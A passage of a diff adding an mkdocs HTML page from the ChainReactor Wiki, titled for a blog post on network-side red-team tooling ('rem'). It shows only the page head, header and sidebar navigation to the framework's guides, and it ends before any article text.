@@ -1,0 +1,5029 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="chainreactors wiki">
+      
+      
+        <meta name="author" content="M09ic">
+      
+      
+        <link rel="canonical" href="https://wiki.chainreactors.red/wiki/blog/todo/%E6%94%BB%E9%98%B2%E5%9C%BA%E6%99%AF%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C%E4%BE%A7%E5%AF%B9%E6%8A%97%E9%9D%A9%E5%91%BD%20%28%E4%B8%8B%29---rem/">
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>攻防场景中的网络侧对抗革命 (下) rem - ChainReactor Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.618322db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-DCRVR86FG2"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-DCRVR86FG2",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-DCRVR86FG2",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#前言" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="ChainReactor Wiki" class="md-header__button md-logo" aria-label="ChainReactor Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            ChainReactor Wiki
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              攻防场景中的网络侧对抗革命 (下)   rem
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/chainreactors/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  导航
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../IoM/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  IoM
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../gogo/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  gogo
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../spray/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  spray
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../zombie/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  zombie
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../rem/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  rem
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../libs/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  libs
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../mapping/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Preview
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="ChainReactor Wiki" class="md-nav__button md-logo" aria-label="ChainReactor Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    ChainReactor Wiki
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/chainreactors/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    导航
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../IoM/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IoM
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    IoM
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/design/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Design
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/quickstart/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Quickstart
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/concept/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Concept
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/roadmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    RoadMap
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_6" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../IoM/guideline/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guideline
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Guideline
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/deploy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    安装部署
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/listener/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Listener
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/payload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Payload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/post_exploitation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    后渗透基本操作
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/embed_mal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    内置插件
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/proxy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代理/隧道
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_6_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_6_8" id="__nav_2_6_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    高级用法
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_6_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    高级用法
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/advance/DumpLSASS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DumpLSASS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/advance/DomainFronting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DomainFronting
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/advance/Multi-Server/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MultiServer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/advance/Guardrail/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Guardrail
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_6_9" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../IoM/guideline/develop/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DevelopGuide
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_6_9" id="__nav_2_6_9_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_6_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_6_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    DevelopGuide
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/manual/mal/quickstart/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    mal快速入门
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/develop/server/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server开发
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/develop/client/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client开发
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/guideline/develop/implant/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Implant开发
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../IoM/manual/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Manual
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Manual
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../IoM/manual/manual/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    client/server
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_7_2" id="__nav_2_7_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_7_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_7_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    client/server
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/manual/manual/deploy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    install&deploy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/manual/manual/listener/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    listener
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/manual/manual/build/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    build
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/manual/manual/client/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    client usage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/manual/manual/implant/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    implant usage
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../IoM/manual/mal/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    mals插件生态
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_7_3" id="__nav_2_7_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_7_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_7_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    mals插件生态
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IoM/manual/mal/embed/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    embed
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
